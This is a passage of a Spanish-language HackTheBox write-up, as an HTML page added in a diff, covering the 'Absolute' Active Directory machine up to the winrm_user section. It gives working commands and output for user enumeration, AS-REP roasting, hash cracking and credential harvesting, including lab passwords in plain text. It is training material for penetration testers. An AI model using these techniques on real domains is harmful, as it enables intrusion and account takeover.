@@ -1,0 +1,832 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup HackTheBox Absolute</title>
+
+  <meta name="description" content="Resolución de la máquina Absolute de la plataforma de HackTheBox">
+  <meta name="author" content="GatoGamer1155">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup HackTheBox Absolute">
+  <meta name="twitter:description" content="Resolución de la máquina Absolute de la plataforma de HackTheBox">
+  <meta name="twitter:creator" content="GatoGamer1155">  
+  <meta name="twitter:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/absolute.png" />
+
+  <meta property="og:site_name" content="GatoGamer1155" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup HackTheBox Absolute">
+  <meta property="og:description" content="Resolución de la máquina Absolute de la plataforma de HackTheBox">
+  <meta property="og:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/absolute.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/absolute.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox Absolute" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
+          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/htb" title="GatoGamer1155" class="blog-button">HackTheBox</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/gatogamer1155" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/gatogamer1155" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/gatogamer1155" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@gatogamer1155" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:gatogamer1155@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#enumeration">Enumeración</a></li>
+        <li><a href="#access-svc_smb">Access - svc_smb</a></li>
+        <li><a href="#access-m.lovegod">Access - m.lovegod</a></li>
+        <li><a href="#shell-winrm_user">Shell - winrm_user</a></li>
+        <li><a href="#shell-administrator">Shell - Administrator</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">HackTheBox</h4>
+    <picture><img src="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/absolute.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Absolute</h2><br>
+  </header>
+  
+<section class="post" id="enumeration">
+<br><h3 class="post-title">Enumeración</h3><br>
+
+<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde encontramos varios puertos abiertos, entre ellos el <code class="language-plaintext highlighter-rouge">80</code> que corre un servicio <code class="language-plaintext highlighter-rouge">http</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap </span><span class="p">10.10.11.181
+Nmap scan report for 10.10.11.181  
+PORT      STATE SERVICE
+53/tcp    open  domain
+80/tcp    open  http
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49673/tcp open  unknown
+49674/tcp open  unknown
+49675/tcp open  unknown
+49686/tcp open  unknown
+49687/tcp open  unknown
+49699/tcp open  unknown
+49703/tcp open  unknown
+64476/tcp open  unknown</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">crackmapexec</code> podemos obtener información de la maquina asi como el <code class="language-plaintext highlighter-rouge">dominio</code> que es <code class="language-plaintext highlighter-rouge">absolute.htb</code> ademas del nombre que es el propio <code class="language-plaintext highlighter-rouge">DC</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb 10.10.11.181
+</span><span class="az">SMB         </span><span class="p">10.10.11.181    445    DC               </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para posibles proximos ataques o solo por comodidad agregaremos el <code class="language-plaintext highlighter-rouge">dominio</code> al <code class="language-plaintext highlighter-rouge">/etc/hosts</code> ademas el <code class="language-plaintext highlighter-rouge">nombre</code> de la máquina que es el DC como otro dominio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ echo </span><span class="am">"10.10.11.181 absolute.htb dc.absolute.htb" </span><span class="p">| </span><span class="ve">sudo tee</span><span class="p"> -a /etc/hosts  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Revisamos la web pero es bastante sencilla sin nada realmente interesante</p>
+<a href="/htb/absolute/1.png" target="_blank"><div><p><img src="/htb/absolute/1.png"></p></div></a>
+
+<p class="plain-text">En el codigo fuente vemos que cambia entre varias imagenes de extension <code class="language-plaintext highlighter-rouge">jpg</code></p>
+<a href="/htb/absolute/2.png" target="_blank"><div><p><img src="/htb/absolute/2.png"></p></div></a>
+
+<p class="plain-text">Descargamos una de ellas y mirando los metadatos con <code class="language-plaintext highlighter-rouge">exiftool</code> encontramos información interesante, lo que mas destaca es el <code class="language-plaintext highlighter-rouge">usuario</code> en el campo <code class="language-plaintext highlighter-rouge">Author</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ exiftool </span><span class="p">hero_1.jpg 
+ExifTool Version Number         : 12.57
+File Name                       : hero_1.jpg
+Directory                       : .
+File Size                       : 407 kB
+File Modification Date/Time     : 2022:06:07 15:45:20-04:00
+File Access Date/Time           : 2023:05:18 13:39:49-04:00
+File Inode Change Date/Time     : 2023:05:18 13:37:41-04:00
+File Permissions                : -rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+Exif Byte Order                 : Little-endian (Intel, II)
+X Resolution                    : 72
+Y Resolution                    : 72
+Resolution Unit                 : inches
+Artist                          : James Roberts
+Y Cb Cr Positioning             : Centered
+Quality                         : 60%
+XMP Toolkit                     : Image::ExifTool 11.88
+Author                          : James Roberts
+Creator Tool                    : Adobe Photoshop CC 2018 Macintosh
+Derived From Document ID        : 6413FD608B5C21D0939F910C0EFBBE44
+Derived From Instance ID        : 6413FD608B5C21D0939F910C0EFBBE44
+Document ID                     : xmp.did:887A47FA048811EA8574B646AF4FC464
+Instance ID                     : xmp.iid:887A47F9048811EA8574B646AF4FC464  
+DCT Encode Version              : 100
+APP14 Flags 0                   : [14], Encoded with Blend=1 downsampling
+APP14 Flags 1                   : (none)
+Color Transform                 : YCbCr
+Image Width                     : 1900
+Image Height                    : 1150
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
+Image Size                      : 1900x1150
+Megapixels                      : 2.2</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Mediante un bucle <code class="language-plaintext highlighter-rouge">for</code> de bash descargamos las <code class="language-plaintext highlighter-rouge">6</code> imagenes y mirando el campo <code class="language-plaintext highlighter-rouge">Author</code> de todas ellas con <code class="language-plaintext highlighter-rouge">exiftool</code> conseguimos una pequeña lista de <code class="language-plaintext highlighter-rouge">usuarios</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ </span><span class="am">for </span><span class="p">i in </span><span class="sa">$(</span><span class="ve">seq </span><span class="p">1 6</span><span class="sa">)</span><span class="p">; </span><span class="am">do </span><span class="ve">wget </span><span class="p">http://absolute.htb/images/hero_$i.jpg &>/dev/null; </span><span class="am">done  
+
+</span><span class="ve">❯ exiftool </span><span class="p">hero_*.jpg -Author
+======== hero_1.jpg
+Author                          : James Roberts
+======== hero_2.jpg
+Author                          : Michael Chaffrey
+======== hero_3.jpg
+Author                          : Donald Klay
+======== hero_4.jpg
+Author                          : Sarah Osvald
+======== hero_5.jpg
+Author                          : Jeffer Robinson
+======== hero_6.jpg
+Author                          : Nicole Smith
+    6 image files read</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Hacemos una lista de los usuarios de diferentes posibles formas para el <code class="language-plaintext highlighter-rouge">username</code>, podemos usar <code class="language-plaintext highlighter-rouge">kerbrute</code> para aplicar fuerza bruta con nuestro diccionario de usuarios, la sintaxis de los usuarios a nivel de dominio parece que es <code class="language-plaintext highlighter-rouge">A.Surname</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ kerbrute </span><span class="p">userenum -d absolute.htb --dc dc.absolute.htb users.txt  
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/ 
+
+>  Using KDC(s):
+>  	dc.absolute.htb:88
+</span><span class="ve">
+>  [+] VALID USERNAME:	 M.Chaffrey@absolute.htb
+>  [+] VALID USERNAME:	 J.Robinson@absolute.htb
+>  [+] VALID USERNAME:	 S.Osvald@absolute.htb
+>  [+] VALID USERNAME:	 J.Roberts@absolute.htb
+>  [+] VALID USERNAME:	 N.Smith@absolute.htb
+>  [+] VALID USERNAME:	 D.Klay@absolute.htb
+</span><span class="p">
+>  Done! Tested 24 usernames (6 valid) in 0.120 seconds</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="access-svc_smb">
+<br><h3 class="post-title">Access - svc_smb</h3><br>
+
+<p class="plain-text">Ya que tenemos una lista de <code class="language-plaintext highlighter-rouge">usuarios</code> validos en el dominio podemos probar si alguno de ellos es <code class="language-plaintext highlighter-rouge">ASREPRoasteable</code>, <code class="language-plaintext highlighter-rouge">D.Klay</code> lo es y nos devuelve su <code class="language-plaintext highlighter-rouge">hash</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-GetNPUsers </span><span class="p">absolute.htb/ -no-pass -usersfile users.txt
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[-] User J.Roberts doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User M.Chaffrey doesn't have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$23$D.Klay@ABSOLUTE.HTB:737c665ed6f9539832cef8fd2fb6b245$399c38e396cdf3c213bb3d9d94cfd260c55a41fad61fa11509fa0aba1c81d01daab383ef4148ddae88145cf4b5cebd8de3523ac789f744d0d188c14b4b8bd8c4ad7b8fbee05d763b7bf177392168bfa9cf954bf13af4a027016dca22c461a228cb818ea02802852abefef9747b36ef7cf3fea1cfd8a7784b76c1fb3646b0639fa55e821254d4a90d5ebd4869848254a376a0f45500e8222dd5f087136fa742a3b043e456d0e0d5993a40e775f435ad7ed0a58abe3ec838e9f3e15abf9f5f5a36e2a8d0303be3b1061dfa06aa4982da3fcdbdf59474672352cfad842d240ba2e2f65c02ed8b8226f34ccc180b  
+[-] User S.Osvald doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User J.Robinson doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User N.Smith doesn't have UF_DONT_REQUIRE_PREAUTH set</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Usando <code class="language-plaintext highlighter-rouge">john</code> podemos crackear este hash y ver la contraseña del usuario <code class="language-plaintext highlighter-rouge">D.Klay</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ john</span><span class="p"> -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 XOP 4x2])  
+Press 'q' or Ctrl-C to abort, almost any other key for status
+</span><span class="am">Darkmoonsky248girl</span><span class="p"> (</span><span class="am">$krb5asrep$23$D.Klay@ABSOLUTE.HTB</span><span class="p">)
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al intentar comprobar las credenciales con <code class="language-plaintext highlighter-rouge">crackmapexec</code> nos devuelve un mensaje  de error <code class="language-plaintext highlighter-rouge">STATUS_ACCOUNT_RESTRICTION</code>, este error es causado cuando el usuario pertenece al grupo <code class="language-plaintext highlighter-rouge">Protected Users</code> ya que aplica algunas restricciones</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb absolute.htb -u D.Klay -p Darkmoonsky248girl
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="sa">[-] </span><span class="p">absolute.htb\D.Klay:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya que realizaremos algunas acciones mediante el protocolo <code class="language-plaintext highlighter-rouge">kerberos</code> es necesario sincronizar la hora usando <code class="language-plaintext highlighter-rouge">ntpdate</code> con el dominio con el que estamos trabajando</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo ntpdate </span><span class="p">-s absolute.htb</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Las restricciones del grupo <code class="language-plaintext highlighter-rouge">Protected Users</code> no afectan al protocolo <code class="language-plaintext highlighter-rouge">kerberos</code> por lo que si nos autenticamos con el agregando un <code class="language-plaintext highlighter-rouge">-k</code> nos devuelve que son correctas</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb absolute.htb -u D.Klay -p Darkmoonsky248girl -k
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="ve">[+] </span><span class="p">absolute.htb\D.Klay:Darkmoonsky248girl</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Enumerando los recursos <code class="language-plaintext highlighter-rouge">SMB</code> a los que ahora tenemos acceso nos encontramos con privilegio <code class="language-plaintext highlighter-rouge">READ</code> pero en varios recursos por <code class="language-plaintext highlighter-rouge">defecto</code> que realmente no nos sirven</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb absolute.htb -u D.Klay -p Darkmoonsky248girl -k --shares
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="ve">[+] </span><span class="p">absolute.htb\D.Klay:Darkmoonsky248girl
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="ve">[+] </span><span class="p">Enumerated shares
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="am">Share           Permissions     Remark
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="am">-----           -----------     ------
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="am">ADMIN$                          Remote Admin
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="am">C$                              Default share
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="am">IPC$            READ            Remote IPC
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="am">NETLOGON        READ            Logon server share 
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="am">Shared                          
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="am">SYSVOL          READ            Logon server share</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Cambiamos al protocolo <code class="language-plaintext highlighter-rouge">ldap</code> para otras consultas, en este caso con <code class="language-plaintext highlighter-rouge">crackmapexec</code> podemos enumerar todos los <code class="language-plaintext highlighter-rouge">usuarios</code> existentes en el dominio, interesantemente el usuario <code class="language-plaintext highlighter-rouge">svc_smb</code> tiene como <code class="language-plaintext highlighter-rouge">descripción</code> lo que parece ser una contraseña</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">ldap absolute.htb -u D.Klay -p Darkmoonsky248girl -k --users
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)  
+</span><span class="az">LDAP        </span><span class="p">absolute.htb    389    DC               </span><span class="ve">[+] </span><span class="p">absolute.htb\D.Klay:Darkmoonsky248girl 
+</span><span class="az">LDAP        </span><span class="p">absolute.htb    389    DC               </span><span class="az">[*] </span><span class="p">Total of records returned 20
+</span><span class="az">LDAP        </span><span class="p">absolute.htb    389    DC               </span><span class="am">Administrator                  Built-in account for administering the computer/domain
+</span><span class="az">LDAP        </span><span class="p">absolute.htb    389    DC               </span><span class="am">Guest                          Built-in account for guest access to the computer/domain
+</span><span class="az">LDAP        </span><span class="p">absolute.htb    389    DC               </span><span class="am">krbtgt                         Key Distribution Center Service Account
+</span><span class="az">LDAP        </span><span class="p">absolute.htb    389    DC               </span><span class="am">J.Roberts                      
+</span><span class="az">LDAP        </span><span class="p">absolute.htb    389    DC               </span><span class="am">M.Chaffrey                     
+</span><span class="az">LDAP        </span><span class="p">absolute.htb    389    DC               </span><span class="am">D.Klay                         
+</span><span class="az">LDAP        </span><span class="p">absolute.htb    389    DC               </span><span class="am">s.osvald                       
+</span><span class="az">LDAP        </span><span class="p">absolute.htb    389    DC               </span><span class="am">j.robinson                     
+</span><span class="az">LDAP        </span><span class="p">absolute.htb    389    DC               </span><span class="am">n.smith                        
+</span><span class="az">LDAP        </span><span class="p">absolute.htb    389    DC               </span><span class="am">m.lovegod                      
+</span><span class="az">LDAP        </span><span class="p">absolute.htb    389    DC               </span><span class="am">l.moore                        
+</span><span class="az">LDAP        </span><span class="p">absolute.htb    389    DC               </span><span class="am">c.colt                         
+</span><span class="az">LDAP        </span><span class="p">absolute.htb    389    DC               </span><span class="am">s.johnson                      
+</span><span class="az">LDAP        </span><span class="p">absolute.htb    389    DC               </span><span class="am">d.lemm                         
+</span><span class="az">LDAP        </span><span class="p">absolute.htb    389    DC               </span><span class="am">svc_smb                        AbsoluteSMBService123!
+</span><span class="az">LDAP        </span><span class="p">absolute.htb    389    DC               </span><span class="am">svc_audit                      
+</span><span class="az">LDAP        </span><span class="p">absolute.htb    389    DC               </span><span class="am">winrm_user                     Used to perform simple network tasks</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">crackmapexec</code> nuevamente con kerberos como metodo de autenticacion comprobamos las credenciales, la contraseña es valida para el usuario <code class="language-plaintext highlighter-rouge">svc_smb</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb absolute.htb -u svc_smb -p AbsoluteSMBService123! -k
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="ve">[+] </span><span class="p">absolute.htb\svc_smb:AbsoluteSMBService123!</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="access-m.lovegod">
+<br><h3 class="post-title">Access - m.lovegod</h3><br>
+
+<p class="plain-text">Si ahora listamos los <code class="language-plaintext highlighter-rouge">recursos</code> compartidos por SMB como el usuario <code class="language-plaintext highlighter-rouge">svc_smb</code> tenemos privilegios de lectura en el recurso <code class="language-plaintext highlighter-rouge">Shared</code> que parece algo interesante</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb absolute.htb -u svc_smb -p AbsoluteSMBService123! -k --shares
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="ve">[+] </span><span class="p">absolute.htb\svc_smb:AbsoluteSMBService123! 
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="ve">[+] </span><span class="p">Enumerated shares
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="am">Share           Permissions     Remark
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="am">-----           -----------     ------
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="am">ADMIN$                          Remote Admin
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="am">C$                              Default share
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="am">IPC$            READ            Remote IPC
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="am">NETLOGON        READ            Logon server share 
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="am">Shared          READ            
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="am">SYSVOL          READ            Logon server share</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nos conectamos al recurso con <code class="language-plaintext highlighter-rouge">smbclient</code> y descargamos todos los archivos en el</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-smbclient </span><span class="p">absolute.htb/svc_smb:</span><span class="am">'AbsoluteSMBService123!'</span><span class="p">@dc.absolute.htb -k  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+Type help for list of commands
+# use Shared
+# ls
+drw-rw-rw-          0  Thu Sep  1 13:02:23 2022 .
+drw-rw-rw-          0  Thu Sep  1 13:02:23 2022 ..
+-rw-rw-rw-         72  Thu Sep  1 13:02:23 2022 compiler.sh
+-rw-rw-rw-      67584  Thu Sep  1 13:02:23 2022 test.exe
+# mget *
+[*] Downloading compiler.sh
+[*] Downloading test.exe
+#</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Los archivos solo son 2, un script en <code class="language-plaintext highlighter-rouge">bash</code> que hace uso de nim para compilar aplicaciones y un archivo llamado <code class="language-plaintext highlighter-rouge">test.exe</code> compilado ejecutable para windows</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ cat </span><span class="p">compiler.sh
+#!/bin/bash
+
+nim c -d:mingw --app:gui --cc:gcc -d:danger -d:strip $1
+</span><span class="ve">
+❯ file </span><span class="p">test.exe 
+test.exe: PE32+ executable (GUI) x86-64 (stripped to external PDB), for MS Windows, 11 sections  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Pasamos el <code class="language-plaintext highlighter-rouge">exe</code> a una máquina <code class="language-plaintext highlighter-rouge">windows</code> para poder ejecutarlo sin embargo al hacerlo este no devuelve ningun tipo de <code class="language-plaintext highlighter-rouge">output</code>, panel de ayuda ni errores</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\pc1\Desktop> </span><span class="am">.\test.exe  </span><span class="p">
+PS C:\Users\pc1\Desktop></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al archivo <code class="language-plaintext highlighter-rouge">hosts</code> de windows agregaremos los <code class="language-plaintext highlighter-rouge">dominios</code> absolute.htb y dc.absolute.htb con la ip de la maquina para que sepa a donde resolver</p>
+<a href="/htb/absolute/3.png" target="_blank"><div><p><img src="/htb/absolute/3.png"></p></div></a>
+
+<p class="plain-text">Si ejecutamos el archivo <code class="language-plaintext highlighter-rouge">exe</code> y con <code class="language-plaintext highlighter-rouge">wireshark</code> interceptamos el trafico, filtrando por peticiones <code class="language-plaintext highlighter-rouge">ldap</code> nos encontramos un intento de autenticacion como <code class="language-plaintext highlighter-rouge">mlovegod</code></p>
+<a href="/htb/absolute/4.png" target="_blank"><div><p><img src="/htb/absolute/4.png"></p></div></a>
+
+<p class="plain-text">Al probar las credenciales el usuario <code class="language-plaintext highlighter-rouge">mlovegod</code> nos devuelve un error, si volvemos a ver los usuarios encontramos a <code class="language-plaintext highlighter-rouge">m.lovegod</code> el cual nos devuelve que son correctas</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb absolute.htb -u mlovegod -p AbsoluteLDAP2022! -k
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="ro">[-] </span><span class="p">absolute.htb\mlovegod: KDC_ERR_C_PRINCIPAL_UNKNOWN</span>
+
+</span><span class="ve">❯ crackmapexec </span><span class="p">smb absolute.htb -u m.lovegod -p AbsoluteLDAP2022! -k
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">absolute.htb    445    DC               </span><span class="ve">[+] </span><span class="p">absolute.htb\m.lovegod:AbsoluteLDAP2022!</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="shell-winrm_user">
+<br><h3 class="post-title">Shell - winrm_user</h3><br>
+
